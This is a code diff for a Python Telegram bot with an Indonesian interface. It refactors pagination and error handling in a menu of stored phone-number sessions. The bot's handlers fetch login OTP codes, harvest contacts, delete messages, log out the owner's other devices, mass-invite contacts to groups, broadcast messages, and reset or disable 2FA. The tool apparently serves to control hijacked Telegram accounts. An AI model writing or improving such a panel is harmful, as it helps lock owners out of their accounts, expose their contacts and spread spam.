@@ -53,25 +53,44 @@ async def send_message_with_eraser(update_or_query, text, parse_mode=None, reply
 # ===== Handler Command /user =====
 
 async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await send_session_list(update, context, 0)
+    await send_session_list(update, context, 1)
 
-async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
+async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 1):
     sessions = get_registered_sessions()
     per_page = 10
+
+    if not sessions:
+        text = "❗ Tidak ada sesi yang terdaftar."
+        if update.callback_query:
+            await update.callback_query.edit_message_text(text)
+        else:
+            await update.message.reply_text(text)
+        return
+
     total_pages = math.ceil(len(sessions) / per_page)
-    start = page * per_page
-    end = start + per_page
+    page = max(1, min(page, total_pages))  # pastikan dalam range
+
+    start = (page - 1) * per_page
+    end = min(start + per_page, len(sessions))  # hindari index out of range
     current_sessions = sessions[start:end]
 
     keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_sessions]
-    page_buttons = [InlineKeyboardButton(f"[{p+1}]" if p == page else str(p+1), callback_data=f"page_{p}") for p in range(total_pages)]
-    keyboard.append(page_buttons)
+
+    if total_pages > 1:
+        page_buttons = [
+            InlineKeyboardButton(
+                f"[{p+1}]" if (p + 1) == page else str(p + 1),
+                callback_data=f"page_{p+1}"
+            ) for p in range(total_pages)
+        ]
+        keyboard.append(page_buttons)
 
     markup = InlineKeyboardMarkup(keyboard)
+    text = "📱 Pilih nomor:"
     if update.callback_query:
-        await update.callback_query.edit_message_text("📱 Pilih nomor:", reply_markup=markup)
+        await update.callback_query.edit_message_text(text, reply_markup=markup)
     else:
-        await update.message.reply_text("📱 Pilih nomor:", reply_markup=markup)
+        await update.message.reply_text(text, reply_markup=markup)
 
 # ===== Handle Select Nomor =====
 
@@ -152,75 +171,92 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     data = query.data
 
-    if data.startswith("page_"):
-        await send_session_list(update, context, int(data.split("_")[1]))
+    try:
+        if data.startswith("page_"):
+            page = int(data.split("_")[1])
+            await send_session_list(update, context, page)
 
-    elif data.startswith("select_"):
-        await handle_select_number(update, context, data.split("_", 1)[1])
+        elif data.startswith("select_"):
+            phone_number = data.split("_", 1)[1]
+            await handle_select_number(update, context, phone_number)
 
-    elif data.startswith("getotp_"):
-        await get_otp_handler(update, context, data.split("_", 1)[1], API_ID, API_HASH)
+        elif data.startswith("getotp_"):
+            phone_number = data.split("_", 1)[1]
+            await get_otp_handler(update, context, phone_number, API_ID, API_HASH)
 
-    elif data.startswith("device_"):
-        await device_info_handler(update, context, data.split("_", 1)[1])
+        elif data.startswith("device_"):
+            phone_number = data.split("_", 1)[1]
+            await device_info_handler(update, context, phone_number)
 
-    elif data.startswith("datakontak_"):
-        phone_number = data.split("_", 1)[1]
-        await data_kontak_handler(update, context, phone_number)
-        await send_back_button(update, phone_number)
+        elif data.startswith("datakontak_"):
+            phone_number = data.split("_", 1)[1]
+            await data_kontak_handler(update, context, phone_number)
+            await send_back_button(update, phone_number)
 
-    elif data.startswith("hapuspesan_"):
-        await hapus_pesan_handler(update, context, data.split("_", 1)[1])
-        await send_back_button(update, data.split("_", 1)[1])
+        elif data.startswith("hapuspesan_"):
+            phone_number = data.split("_", 1)[1]
+            await hapus_pesan_handler(update, context, phone_number)
+            await send_back_button(update, phone_number)
 
-    elif data.startswith("join_grup_"):
-        phone_number = data.split("_", 2)[2]
-        await invite_contacts(update, context, phone_number)
+        elif data.startswith("join_grup_"):
+            parts = data.split("_")
+            if len(parts) > 2:
+                phone_number = parts[2]
+                await invite_contacts(update, context, phone_number)
+            else:
+                await query.message.reply_text("❌ Data tidak valid.")
 
+        elif data.startswith("logout_"):
+            phone_number = data.split("_", 1)[1]
+            await logout_other_devices(update, context, phone_number)
+            await send_back_button(update, phone_number)
 
-    elif data.startswith("logout_"):
-        await handle_logout_device(update, context, data.split("_", 1)[1]) # type: ignore
-        await send_back_button(update, data.split("_", 1)[1])
+        elif data.startswith("broadcast_"):
+            phone_number = data.split("_", 1)[1]
+            keyboard = [
+                [InlineKeyboardButton("📨 Semua", callback_data=f"broadcastmode_all_{phone_number}"),
+                 InlineKeyboardButton("👥 Kontak", callback_data=f"broadcastmode_contact_{phone_number}")],
+                [InlineKeyboardButton("🟢 Grup", callback_data=f"broadcastmode_group_{phone_number}")],
+                [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
+            ]
+            await query.message.reply_text("Pilih mode broadcast:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data.startswith("broadcast_"):
-        phone_number = data.split("_", 1)[1]
-        keyboard = [
-            [InlineKeyboardButton("📨 Semua", callback_data=f"broadcastmode_all_{phone_number}"),
-             InlineKeyboardButton("👥 Kontak", callback_data=f"broadcastmode_contact_{phone_number}")],
-            [InlineKeyboardButton("🟢 Grup", callback_data=f"broadcastmode_group_{phone_number}")],
-            [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
-        ]
-        await query.message.reply_text("Pilih mode broadcast:", reply_markup=InlineKeyboardMarkup(keyboard))
+        elif data.startswith("broadcastmode_"):
+            _, mode, phone_number = data.split("_", 2)
+            await broadcast_via_dialog_handler(update, context, phone_number, mode)
+            await send_back_button(update, phone_number)
 
-    elif data.startswith("broadcastmode_"):
-        _, mode, phone_number = data.split("_", 2)
-        await broadcast_via_dialog_handler(update, context, phone_number, mode)
-        await send_back_button(update, phone_number)
+        elif data.startswith("verify_2fa_menu_"):
+            phone_number = data.split("_", 3)[3]
+            keyboard = [
+                [InlineKeyboardButton("🔐 Cek/Ganti 2FA", callback_data=f"check_2fa_{phone_number}")],
+                [InlineKeyboardButton("♻️ Reset dan Setel Ulang 2FA", callback_data=f"reset_2fa_{phone_number}")],
+                [InlineKeyboardButton("❌ Nonaktifkan 2FA", callback_data=f"disable_2fa_{phone_number}")],
+                [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
+            ]
+            await query.message.reply_text(f"🔐 Pilih tindakan untuk 2FA `{phone_number}`:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data.startswith("verify_2fa_menu_"):
-        phone_number = data.split("_", 3)[3]
-        keyboard = [
-            [InlineKeyboardButton("🔐 Cek/Ganti 2FA", callback_data=f"check_2fa_{phone_number}")],
-            [InlineKeyboardButton("♻️ Reset dan Setel Ulang 2FA", callback_data=f"reset_2fa_{phone_number}")],
-            [InlineKeyboardButton("❌ Nonaktifkan 2FA", callback_data=f"disable_2fa_{phone_number}")],
-            [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
-        ]
-        await query.message.reply_text(f"🔐 Pilih tindakan untuk 2FA `{phone_number}`:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+        elif data.startswith("check_2fa_"):
+            phone_number = data.split("_", 2)[2]
+            await check_2fa_status(update, context, phone_number)
 
-    elif data.startswith("check_2fa_"):
-        await check_2fa_status(update, context, data.split("_", 2)[2])
+        elif data.startswith("reset_2fa_"):
+            phone_number = data.split("_", 2)[2]
+            await remove_and_set_2fa(update, context, phone_number)
 
-    elif data.startswith("reset_2fa_"):
-        await remove_and_set_2fa(update, context, data.split("_", 2)[2])
+        elif data.startswith("disable_2fa_"):
+            phone_number = data.split("_", 2)[2]
+            await disable_2fa(update, context, phone_number)
 
-    elif data.startswith("disable_2fa_"):
-        await disable_2fa(update, context, data.split("_", 2)[2])
+        elif data.startswith("eraser_"):
+            try:
+                await update.callback_query.message.delete()
+            except Exception as e:
+                await update.callback_query.message.reply_text(f"⚠️ Gagal menghapus pesan: {e}")
 
-    elif data.startswith("eraser_"):
-        try:
-            await update.callback_query.message.delete()
-        except Exception as e:
-            await update.callback_query.message.reply_text(f"⚠️ Gagal menghapus pesan: {e}")
+    except Exception as e:
+        await query.message.reply_text(f"⚠️ Terjadi kesalahan: {str(e)}")
+
 
 # ===== Fungsi Back Button ke Menu =====
 
